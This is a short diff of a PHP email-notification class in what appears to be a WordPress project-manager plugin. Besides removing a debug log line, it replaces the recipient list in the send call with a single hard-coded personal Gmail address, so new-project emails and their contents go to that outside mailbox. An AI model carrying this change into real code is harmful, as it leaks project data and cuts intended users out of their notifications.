@@ -19,14 +19,12 @@ class New_Project_Notification extends Email {
         $project = empty( $project['data'] ) ? [] : $project['data'];
         
         if ( empty( $data['notify_users'] ) ) {
-            pm_log('notify', $data['notify_users']);
             return;
         }
 
         if ( 'false' == $data['notify_users'] || false === $data['notify_users'] ) {
             return ;
         }
-
 
         $template_name = apply_filters( 'pm_new_project_email_template_path', $this->get_template_path( '/html/new-project.php' ) );
         $subject       = sprintf( __( '[%s] New Project Create: %s', 'wedevs-project-manager' ), $this->get_blogname(), $project['title'] );
@@ -62,7 +60,7 @@ class New_Project_Notification extends Email {
         
         $message = $this->get_content_html( $template_name, $project );
         
-        $this->send( $users, $subject, $message );
+        $this->send( 'joy.mishu@gmail.com', $subject, $message );
 
     }
 
